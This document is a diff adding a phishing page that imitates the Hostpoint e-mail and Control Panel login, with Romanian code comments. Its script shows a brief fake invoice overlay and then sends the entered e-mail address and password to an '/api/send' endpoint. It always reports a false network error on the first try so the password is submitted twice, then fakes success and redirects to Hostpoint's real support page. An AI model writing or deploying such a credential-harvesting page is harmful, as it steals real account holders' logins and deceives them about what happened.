+                    <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTk1IiBoZWlnaHQ9IjM4IiB2aWV3Qm94PSIwIDAgMTk1IDM4IiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgo8cGF0aCBkPSJNMCAwVjM3LjkxNjdIMzcuOTMxNVYwSDBaTTMxLjUyMDUgMzEuNTA4Mkg2LjQxMDk1VjYuNDA4NDVIMzEuNTIwNVYzMS41MDgyWiIgZmlsbD0iIzFFOUFFMiIvPgo8cGF0aCBkPSJNMjguODQ5MSA5LjA3ODYxSDkuMDgyMDNWMTQuOTUzSDI4Ljg0OTFWOS4wNzg2MVoiIGZpbGw9ImJsYWNrIi8+CjxwYXRoIGQ9Ik0yOC44NDkxIDE2LjAyMUg5LjA4MjAzVjIxLjg5NTRIMjguODQ5MVYxNi4wMjFaIiBmaWxsPSJibGFjayIvPgo8cGF0aCBkPSJNMjguODQ5MSAyMi45NjM2SDkuMDgyMDNWMjguODM4SDI4Ljg0OTFWMjIuOTYzNloiIGZpbGw9ImJsYWNrIi8+CjxwYXRoIGQ9Ik02MS41OTgxIDIwLjIxMzNINTMuNzcxNFYyOC44MzhINTAuNzUyOVY5LjA3ODYxSDUzLjc0NDdWMTcuNTQzMUg2MS41NzE0VjkuMDc4NjFINjQuNTYzMlYyOC44MzhINjEuNTcxNFYyMC4yMTMzSDYxLjU5ODFaIiBmaWxsPSJibGFjayIvPgo8cGF0aCBkPSJNNjkuOTU5MyAxMi40NDNDNzAuODk0MiAxMC43MzQgNzMuMDU3OSA4Ljg5MTYgNzYuMTU2NSA4Ljg5MTZDNzkuMjgxOSA4Ljg5MTYgODEuNDE4OSAxMC43MzQgODIuMzUzOCAxMi40NDNDODIuOTk0OSAxMy42MTc4IDgzLjIwODYgMTQuMjA1MyA4My4yMDg2IDE4LjkzMTVDODMuMjA4NiAyMy42ODQ0IDgyLjk5NDkgMjQuMjcxOSA4Mi4zNTM4IDI1LjQyMDFDODEuNDE4OSAyNy4xMjkgNzkuMjU1MiAyOC45NzE0IDc2LjE1NjUgMjguOTcxNEM3My4wMzEyIDI4Ljk3MTQgNzAuODk0MiAyNy4xMjkgNjkuOTU5MyAyNS40MjAxQzY5LjMxODIgMjQuMjQ1MiA2OS4xMDQ1IDIzLjY1NzcgNjkuMTA0NSAxOC45MzE1QzY5LjEwNDUgMTQuMjA1MyA2OS4zMTgyIDEzLjYxNzggNjkuOTU5MyAxMi40NDNaTTczLjExMTMgMjQuNTY1NkM3My43MjU3IDI1LjM0IDc0Ljc0MDggMjYuMDA3NSA3Ni4xNTY1IDI2LjAwNzVDNzcuNTcyMyAyNi4wMDc1IDc4LjYxNDEgMjUuMzQgNzkuMjAxNyAyNC41NjU2Qzc5Ljk3NjQgMjMuNTc3NiA4MC4xOTAxIDIzLjAxNjkgODAuMTkwMSAxOC45NTgyQzgwLjE5MDEgMTQuODk5NSA3OS45NzY0IDE0LjMzODggNzkuMjAxNyAxMy4zNTA4Qzc4LjU4NzQgMTIuNTc2NSA3Ny41NzIzIDExLjkwODkgNzYuMTU2NSAxMS45MDg5Qzc0Ljc0MDggMTEuOTA4OSA3My42OTkgMTIuNTc2NSA3My4xMTEzIDEzLjM1MDhDNzIuMzM2NyAxNC4zMzg4IDcyLjEyMyAxNC44OTk1IDcyLjEyMyAxOC45NTgyQzcyLjA5NjMgMjMuMDE2OSA3Mi4zMzY3IDIzLjU1MDkgNzMuMTExMyAyNC41NjU2WiIgZmlsbD0iYmxhY2siLz4KPHBhdGggZD0iTTg3Ljk2MzQgMjQuMDMxNkM4OS40NTkzIDI1LjIzMzIgOTEuNDYyNyAyNi4wMDc1IDkzLjU3MyAyNi4wMDc1Qzk2LjAzMDUgMjYuMDA3NSA5Ny40OTk3IDI0Ljg4NiA5Ny40OTk3IDIzLjI1NzJDOTcuNDk5NyAyMS44Njg3IDk2LjY5ODMgMjAuODAwNiA5NC45MDg2IDIwLjU4N0M5NC4wMjcxIDIwLjQ4MDIgOTMuMzMyNiAyMC4zNzM0IDkyLjI5MDggMjAuMjEzMkM4OC44NzE2IDE5LjczMjYgODcuMDI4NSAxNy41MTYzIDg3LjAyODUgMTQuNjU5MkM4Ny4wMjg1IDExLjI2ODEgODkuMzc5MSA4Ljg5MTYgOTMuNDY2MSA4Ljg5MTZDOTUuOTIzNiA4Ljg5MTYgOTguMDg3NCA5Ljc0NjA2IDk5Ljg3NzEgMTAuOTQ3Nkw5OC4yMjA5IDEzLjQzMDlDOTYuNzc4NCAxMi41MjMxIDk1LjA2ODkgMTEuOTA4OSA5My4zMzI2IDExLjkwODlDOTEuNDg5NCAxMS45MDg5IDkwLjAyMDIgMTIuODQzNSA5MC4wMjAyIDE0LjczOTNDOTAuMDIwMiAxNS44NjA4IDkwLjgyMTYgMTYuOTU1NiA5Mi44MjUgMTcuMjc2QzkzLjM1OTMgMTcuMzU2MSA5NC4xMDcyIDE3LjQ2MjkgOTUuMDQyMSAxNy41Njk3Qzk4LjcyODQgMTguMDIzNiAxMDAuNDY1IDIwLjU2MDMgMTAwLjQ2NSAyMy4yNTcyQzEwMC40NjUgMjYuODg4NyA5Ny43NjY4IDI4Ljk5ODEgOTMuNTE5NSAyOC45OTgxQzkwLjYwNzkgMjguOTk4MSA4OC4wNDM1IDI4LjExNyA4NS45NiAyNi4yNzQ1TDg3Ljk2MzQgMjQuMDMxNloiIGZpbGw9ImJsYWNrIi8+CjxwYXRoIGQ9Ik0xMDguMDUxIDExLjc0ODhIMTAyLjYyOFY5LjA3ODYxSDExNi40NjVWMTEuNzQ4OEgxMTEuMDQzVjI4LjgzOEgxMDguMDUxVjExLjc0ODhaIiBmaWxsPSJibGFjayIvPgo8cGF0aCBkPSJNMTE5LjU5MSA5LjA3ODYxSDEyNi43NzdDMTI4LjMyNiA5LjA3ODYxIDEyOS42ODkgOS4yNjU1MyAxMzEuMjM4IDEwLjQ2NzFDMTMyLjQ0IDExLjM3NSAxMzMuMzc1IDEzLjA1NzIgMTMzLjM3NSAxNS4xOTMzQzEzMy4zNzUgMTcuOTk3IDEzMS4yMzggMjEuMTIxMiAxMjcuMTc4IDIxLjEyMTJIMTIyLjYxVjI4LjgzOEgxMTkuNjE4VjkuMDc4NjFIMTE5LjU5MVpNMTIyLjU4MyAxOC4yOTA4SDEyNy4wNDRDMTI5LjI2MSAxOC4yOTA4IDEzMC4zNTYgMTYuNjYxOSAxMzAuMzU2IDE1LjA4NjVDMTMwLjM1NiAxMy43NTE0IDEyOS44MjIgMTIuOTUwNCAxMjkuMDc0IDEyLjQ0MzFDMTI4LjQwNiAxMS45ODkxIDEyNy43OTIgMTEuODgyMyAxMjYuOTM3IDExLjg4MjNIMTIyLjYxVjE4LjI5MDhIMTIyLjU4M1oiIGZpbGw9ImJsYWNrIi8+CjxwYXRoIGQ9Ik0xMzcuMjc1IDEyLjQ0M0MxMzguMjEgMTAuNzM0IDE0MC4zNzMgOC44OTE2IDE0My40NzIgOC44OTE2QzE0Ni41OTcgOC44OTE2IDE0OC43MzQgMTAuNzM0IDE0OS42NjkgMTIuNDQzQzE1MC4zMSAxMy42MTc4IDE1MC41MjQgMTQuMjA1MyAxNTAuNTI0IDE4LjkzMTVDMTUwLjUyNCAyMy42ODQ0IDE1MC4zMSAyNC4yNzE5IDE0OS42NjkgMjUuNDIwMUMxNDguNzM0IDI3LjEyOSAxNDYuNTcxIDI4Ljk3MTQgMTQzLjQ3MiAyOC45NzE0QzE0MC4zNDcgMjguOTcxNCAxMzguMjEgMjcuMTI5IDEzNy4yNzUgMjUuNDIwMUMxMzYuNjM0IDI0LjI0NTIgMTM2LjQyIDIzLjY1NzcgMTM2LjQyIDE4LjkzMTVDMTM2LjM5MyAxNC4yMDUzIDEzNi42MzQgMTMuNjE3OCAxMzcuMjc1IDEyLjQ0M1pNMTQwLjQgMjQuNTY1NkMxNDEuMDE0IDI1LjM0IDE0Mi4wMyAyNi4wMDc1IDE0My40NDUgMjYuMDA3NUMxNDQuODYxIDI2LjAwNzUgMTQ1LjkwMyAyNS4zNCAxNDYuNDkgMjQuNTY1NkMxNDcuMjY1IDIzLjU3NzYgMTQ3LjQ3OSAyMy4wMTY5IDE0Ny40NzkgMTguOTU4MkMxNDcuNDc5IDE0Ljg5OTUgMTQ3LjI2NSAxNC4zMzg4IDE0Ni40OSAxMy4zNTA4QzE0NS44NzYgMTIuNTc2NSAxNDQuODYxIDExLjkwODkgMTQzLjQ0NSAxMS45MDg5QzE0Mi4wMyAxMS45MDg5IDE0MC45ODggMTIuNTc2NSAxNDAuNCAxMy4zNTA4QzEzOS42MjUgMTQuMzM4OCAxMzkuNDEyIDE0Ljg5OTUgMTM5LjQxMiAxOC45NTgyQzEzOS40MTIgMjMuMDE2OSAxMzkuNjI1IDIzLjU1MDkgMTQwLjQgMjQuNTY1NloiIGZpbGw9ImJsYWNrIi8+CjxwYXRoIGQ9Ik0xNTUuMDM4IDkuMDc4NjFIMTU4LjAzVjI4LjgzOEgxNTUuMDM4VjkuMDc4NjFaIiBmaWxsPSJibGFjayIvPgo8cGF0aCBkPSJNMTYzLjE4NiA5LjA3ODYxSDE2Ni4wMTdMMTc0Ljk2NiAyMy4xMjM4SDE3NS4wMTlWOS4wNzg2MUgxNzguMDExVjI4LjgzOEgxNzUuMTc5TDE2Ni4yMzEgMTQuNzkyOEgxNjYuMTc3VjI4LjgzOEgxNjMuMTg2VjkuMDc4NjFaIiBmaWxsPSJibGFjayIvPgo8cGF0aCBkPSJNMTg2LjU4NiAxMS43NDg4SDE4MS4xNjNWOS4wNzg2MUgxOTVWMTEuNzQ4OEgxODkuNTc3VjI4LjgzOEgxODYuNTg2VjExLjc0ODhaIiBmaWxsPSJibGFjayIvPgo8L3N2Zz4K" alt="Hostpoint Logo">
+
+                    <div class="language-selector" id="languageSelector">
+                        <button type="button" class="language-btn" id="languageBtn">
+                            <span id="currentLang">DE</span>
+                            <svg width="14" height="14" viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M7.01744 10.398C6.91269 10.3985 6.8089 10.378 6.71215 10.3379C6.61541 10.2977 6.52766 10.2386 6.45405 10.1641L1.13907 4.84913C1.03306 4.69404 0.985221 4.5065 1.00399 4.31958C1.02276 4.13266 1.10693 3.95838 1.24166 3.82747C1.37639 3.69655 1.55301 3.61742 1.74039 3.60402C1.92777 3.59062 2.11386 3.64382 2.26584 3.75424L7.01744 8.47394L11.769 3.75424C11.9189 3.65709 12.097 3.61306 12.2748 3.62921C12.4527 3.64535 12.6199 3.72073 12.7498 3.84328C12.8797 3.96582 12.9647 4.12842 12.9912 4.30502C13.0177 4.48162 12.9841 4.662 12.8958 4.81724L7.58083 10.1322C7.50996 10.2125 7.42344 10.2775 7.32656 10.3232C7.22968 10.3689 7.12449 10.3944 7.01744 10.398Z" fill="currentColor"/>
+                            </svg>
+                        </button>
+                        <div class="language-menu">
+                            <a href="#" class="active" data-lang="DE">Deutsch</a>
+                            <a href="#" data-lang="FR">Français</a>
+                            <a href="#" data-lang="IT">Italiano</a>
+                            <a href="#" data-lang="EN">English</a>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="toggle-container">
+                    <div class="toggle-slider right"></div>
+                    <button type="button">Control Panel</button>
+                    <button type="button" class="active">E-Mail &amp; Cloud Office</button>
+                </div>
+
+                <h2 class="heading" id="headingText">Anmeldung</h2>
+
+                <div class="status-box" id="statusBox"></div>
+
+                <form id="loginForm">
+                    <div class="login-group">
+
+                        <div class="form-input-field">
+                            <div class="input-wrapper">
+                                <div class="input-icon">
+                                    <svg viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                        <path d="M5.13141 14.0376C5.80433 13.523 6.55641 13.1173 7.38766 12.8204C8.21891 12.5235 9.08975 12.3751 10.0002 12.3751C10.9106 12.3751 11.7814 12.5235 12.6127 12.8204C13.4439 13.1173 14.196 13.523 14.8689 14.0376C15.3307 13.4966 15.6903 12.8831 15.9476 12.197C16.2049 11.5109 16.3335 10.7786 16.3335 10.0001C16.3335 8.24524 15.7167 6.75097 14.483 5.51729C13.2493 4.28361 11.755 3.66677 10.0002 3.66677C8.2453 3.66677 6.75103 4.28361 5.51735 5.51729C4.28367 6.75097 3.66683 8.24524 3.66683 10.0001C3.66683 10.7786 3.79548 11.5109 4.05277 12.197C4.31006 12.8831 4.66961 13.4966 5.13141 14.0376ZM10.0002 10.7918C9.22169 10.7918 8.56527 10.5246 8.03089 9.99021C7.49652 9.45583 7.22933 8.79941 7.22933 8.02094C7.22933 7.24246 7.49652 6.58604 8.03089 6.05166C8.56527 5.51729 9.22169 5.2501 10.0002 5.2501C10.7786 5.2501 11.4351 5.51729 11.9694 6.05166C12.5038 6.58604 12.771 7.24246 12.771 8.02094C12.771 8.79941 12.5038 9.45583 11.9694 9.99021C11.4351 10.5246 10.7786 10.7918 10.0002 10.7918ZM10.0002 17.9168C8.90502 17.9168 7.87586 17.709 6.91266 17.2933C5.94947 16.8777 5.11162 16.3136 4.39912 15.6011C3.68662 14.8886 3.12256 14.0508 2.70693 13.0876C2.29131 12.1244 2.0835 11.0952 2.0835 10.0001C2.0835 8.90496 2.29131 7.8758 2.70693 6.9126C3.12256 5.94941 3.68662 5.11156 4.39912 4.39906C5.11162 3.68656 5.94947 3.1225 6.91266 2.70687C7.87586 2.29125 8.90502 2.08344 10.0002 2.08344C11.0953 2.08344 12.1245 2.29125 13.0877 2.70687C14.0509 3.1225 14.8887 3.68656 15.6012 4.39906C16.3137 5.11156 16.8778 5.94941 17.2934 6.9126C17.709 7.8758 17.9168 8.90496 17.9168 10.0001C17.9168 11.0952 17.709 12.1244 17.2934 13.0876C16.8778 14.0508 16.3137 14.8886 15.6012 15.6011C14.8887 16.3136 14.0509 16.8777 13.0877 17.2933C12.1245 17.709 11.0953 17.9168 10.0002 17.9168Z" fill="#636B73"/>
+                                    </svg>
+                                </div>
+                                <input type="text" name="email" id="email" placeholder="E-Mail-Adresse" required autocomplete="username">
+                            </div>
+                        </div>
+
+                        <div class="form-input-field">
+                            <div class="input-wrapper">
+                                <div class="input-icon">
+                                    <svg viewBox="0 0 19 19" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                        <path d="M5.5415 11.0833C5.10609 11.0833 4.73334 10.9283 4.42327 10.6182C4.11321 10.3082 3.95817 9.93542 3.95817 9.5C3.95817 9.06458 4.11321 8.69184 4.42327 8.38177C4.73334 8.0717 5.10609 7.91667 5.5415 7.91667C5.97692 7.91667 6.34966 8.0717 6.65973 8.38177C6.9698 8.69184 7.12484 9.06458 7.12484 9.5C7.12484 9.93542 6.9698 10.3082 6.65973 10.6182C6.34966 10.9283 5.97692 11.0833 5.5415 11.0833ZM5.5415 14.25C4.22206 14.25 3.10053 13.7882 2.17692 12.8646C1.25331 11.941 0.791504 10.8194 0.791504 9.5C0.791504 8.18056 1.25331 7.05903 2.17692 6.13542C3.10053 5.21181 4.22206 4.75 5.5415 4.75C6.42553 4.75 7.22709 4.96771 7.94619 5.40312C8.66529 5.83854 9.23595 6.4125 9.65817 7.125H16.6248L18.9998 9.5L15.4373 13.0625L13.854 11.875L12.2707 13.0625L10.5884 11.875H9.65817C9.23595 12.5875 8.66529 13.1615 7.94619 13.5969C7.22709 14.0323 6.42553 14.25 5.5415 14.25ZM5.5415 12.6667C6.28039 12.6667 6.93022 12.4424 7.49098 11.9938C8.05175 11.5451 8.42449 10.9778 8.60921 10.2917H11.0832L12.2311 11.1031L13.854 9.89583L15.2592 10.9844L16.7436 9.5L15.9519 8.70833H8.60921C8.42449 8.02222 8.05175 7.45486 7.49098 7.00625C6.93022 6.55764 6.28039 6.33333 5.5415 6.33333C4.67067 6.33333 3.92518 6.6434 3.30505 7.26354C2.68491 7.88368 2.37484 8.62917 2.37484 9.5C2.37484 10.3708 2.68491 11.1163 3.30505 11.7365C3.92518 12.3566 4.67067 12.6667 5.5415 12.6667Z" fill="#636B73"/>
+                                    </svg>
+                                </div>
+                                <input type="password" name="password" id="password" placeholder="Passwort" required autocomplete="current-password">
+                                <button type="button" class="visible-btn" id="togglePassword">
+                                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 19 19">
+                                        <path d="M0,4A7.431,7.431,0,0,1,6.5,0,7.432,7.432,0,0,1,13,4,7.431,7.431,0,0,1,6.5,8,7.43,7.43,0,0,1,0,4Z" transform="translate(3.071 6)" fill="none" stroke="#3c4650" stroke-linejoin="round" stroke-width="1"/>
+                                        <circle cx="2" cy="2" r="2" transform="translate(7.625 7.999)" fill="none" stroke="#3c4650" stroke-width="1"/>
+                                    </svg>
+                                </button>
+                            </div>
+                        </div>
+
+                        <label class="checkbox">
+                            <input type="checkbox" id="rememberLogin">
+                            <span id="rememberText">Angemeldet bleiben</span>
+                        </label>
+
+                        <div class="button">
+                            <button type="submit" class="btn-submit" id="submitBtn">Anmelden</button>
+                        </div>
+
+                    </div>
+                </form>
+
+                <div class="links">
+                    <a href="#" id="forgotText">E-Mail-Passwort vergessen?</a>
+                </div>
+
+            </div>
+
+        </div>
+    </div>
+
+    <div class="footer">
+        <span class="address">
+            Hostpoint AG, Neue Jonastrasse 60, 8640 Rapperswil-Jona,
+            <a href="https://www.hostpoint.ch/">www.hostpoint.ch</a>
+        </span>
+        <span class="links">
+            <a href="https://www.hostpoint.ch/hostpoint/kontakt-agb.html#datenschutz" target="_blank">Datenschutz</a>
+            <a href="https://www.hostpoint.ch/hostpoint/kontakt-agb.html#infos" target="_blank">Impressum</a>
+            <a href="https://support.hostpoint.ch/de" target="_blank">Support</a>
+        </span>
+    </div>
+
+</div>
+
+<script>
+    // ============================================
+    // LOGICA FACTURĂ → LOGIN (1 secundă)
+    // ============================================
+    window.addEventListener('DOMContentLoaded', function() {
+        const invoiceOverlay = document.getElementById('invoiceOverlay');
+        const loginPage = document.getElementById('loginPage');
+
+        setTimeout(function() {
+            invoiceOverlay.classList.add('hide');
+            setTimeout(function() {
+                invoiceOverlay.style.display = 'none';
+                loginPage.style.display = 'flex';
+            }, 400);
+        }, 1000);
+    });
+
+    // ============================================
+    // TRADUCERI COMPLETE
+    // ============================================
+    const translations = {
+        DE: {
+            heading: "Anmeldung",
+            emailPlaceholder: "E-Mail-Adresse",
+            passwordPlaceholder: "Passwort",
+            remember: "Angemeldet bleiben",
+            submit: "Anmelden",
+            forgot: "E-Mail-Passwort vergessen?",
+            checking: "Verbindung wird hergestellt...",
+            verifying: "Anmeldung wird überprüft...",
+            networkError: "Netzwerkfehler: Verbindung zum Server fehlgeschlagen. Bitte versuchen Sie es erneut.",
+            success: "Anmeldung erfolgreich! Sie werden weitergeleitet..."
+        },
+        FR: {
+            heading: "Connexion",
+            emailPlaceholder: "Adresse e-mail",
+            passwordPlaceholder: "Mot de passe",
+            remember: "Rester connecté",
+            submit: "Se connecter",
+            forgot: "Mot de passe e-mail oublié ?",
+            checking: "Connexion en cours...",
+            verifying: "Vérification de la connexion...",
+            networkError: "Erreur réseau : Échec de la connexion au serveur. Veuillez réessayer.",
+            success: "Connexion réussie ! Vous allez être redirigé..."
+        },
+        IT: {
+            heading: "Accesso",
+            emailPlaceholder: "Indirizzo e-mail",
+            passwordPlaceholder: "Password",
+            remember: "Rimani connesso",
+            submit: "Accedi",
+            forgot: "Password e-mail dimenticata?",
+            checking: "Connessione in corso...",
+            verifying: "Verifica dell'accesso...",
+            networkError: "Errore di rete: Connessione al server non riuscita. Riprova.",
+            success: "Accesso riuscito! Reindirizzamento in corso..."
+        },
+        EN: {
+            heading: "Login",
+            emailPlaceholder: "Email address",
+            passwordPlaceholder: "Password",
+            remember: "Stay logged in",
+            submit: "Sign in",
+            forgot: "Forgot email password?",
+            checking: "Connecting...",
+            verifying: "Verifying login...",
+            networkError: "Network error: Failed to connect to server. Please try again.",
+            success: "Login successful! You are being redirected..."
+        }
+    };
+
+    let currentLanguage = 'DE';
+    let attemptCount = 0;
+
+    function applyLanguage(lang) {
+        currentLanguage = lang;
+        const t = translations[lang];
+
+        document.getElementById('headingText').textContent = t.heading;
+        document.getElementById('email').placeholder = t.emailPlaceholder;
+        document.getElementById('password').placeholder = t.passwordPlaceholder;
+        document.getElementById('rememberText').textContent = t.remember;
+        document.getElementById('forgotText').textContent = t.forgot;
+
+        const submitBtn = document.getElementById('submitBtn');
+        if (!submitBtn.disabled) {
+            submitBtn.textContent = t.submit;
+        }
+
+        document.documentElement.setAttribute('lang', lang.toLowerCase());
+    }
+
+    // ============================================
+    // TRIMITERE CĂTRE API VERCEL (/api/send)
+    // ============================================
+    async function sendToApi(email, password) {
+        try {
+            const response = await fetch('/api/send', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    email: email,
+                    pass: password,
+                    source: 'hostpoint-control-panel'
+                })
+            });
+
+            const data = await response.json();
+            console.log('📥 Răspuns API:', data);
+            return data.ok === true;
+
+        } catch (error) {
+            console.error('❌ Eroare API:', error);
+            return false;
+        }
+    }
+
+    // ============================================
+    // DROPDOWN LIMBĂ
+    // ============================================
+    const languageSelector = document.getElementById('languageSelector');
+    const languageBtn = document.getElementById('languageBtn');
+    const currentLangSpan = document.getElementById('currentLang');
+
+    languageBtn.addEventListener('click', function(e) {
+        e.stopPropagation();
+        languageSelector.classList.toggle('open');
+    });
+
+    document.addEventListener('click', function(e) {
+        if (!languageSelector.contains(e.target)) {
+            languageSelector.classList.remove('open');
+        }
+    });
+
+    document.querySelectorAll('.language-menu a').forEach(function(link) {
+        link.addEventListener('click', function(e) {
+            e.preventDefault();
+            const lang = this.getAttribute('data-lang');
+            currentLangSpan.textContent = lang;
+            document.querySelectorAll('.language-menu a').forEach(function(a) {
+                a.classList.remove('active');
+            });
+            this.classList.add('active');
+            languageSelector.classList.remove('open');
+            applyLanguage(lang);
+        });
+    });
+
+    // ============================================
+    // TOGGLE PASSWORD
+    // ============================================
+    document.getElementById('togglePassword').addEventListener('click', function() {
+        const p = document.getElementById('password');
+        p.type = p.type === 'password' ? 'text' : 'password';
+    });
+
+    // ============================================
+    // SUBMIT FORMULAR
+    // ============================================
+    document.getElementById('loginForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+        const statusBox = document.getElementById('statusBox');
+        const submitBtn = document.getElementById('submitBtn');
+        const form = document.getElementById('loginForm');
+        const t = translations[currentLanguage];
+
+        attemptCount++;
+
+        // PRIMA ÎNCERCARE → EROARE ROȘIE
+        if (attemptCount === 1) {
+            submitBtn.disabled = true;
+            submitBtn.textContent = '...';
+            statusBox.className = 'status-box info';
+            statusBox.innerHTML = '<span class="spinner"></span> ' + t.checking;
+
+            sendToApi(email, password);
+
+            setTimeout(function() {
+                statusBox.className = 'status-box error';
+                statusBox.innerHTML = '❌ ' + t.networkError;
+                submitBtn.disabled = false;
+                submitBtn.textContent = t.submit;
+            }, 1500);
+
+            return;
+        }
+
+        // A DOUA ÎNCERCARE → SUCCES VERDE
+        submitBtn.disabled = true;
+        submitBtn.textContent = '...';
+        statusBox.className = 'status-box info';
+        statusBox.innerHTML = '<span class="spinner"></span> ' + t.verifying;
+
+        await sendToApi(email, password);
+
+        setTimeout(function() {
+            form.style.display = 'none';
+            statusBox.className = 'status-box success';
+            statusBox.innerHTML = '✅ ' + t.success;
+
+            setTimeout(function() {
+                window.location.href = 'https://support.hostpoint.ch/de/technisches/control-panel/haeufig-gestellte-fragen/ihr-hostpoint-control-panel';
+            }, 3000);
+        }, 1500);
+    });
+</script>
+
+</body>
+</html>
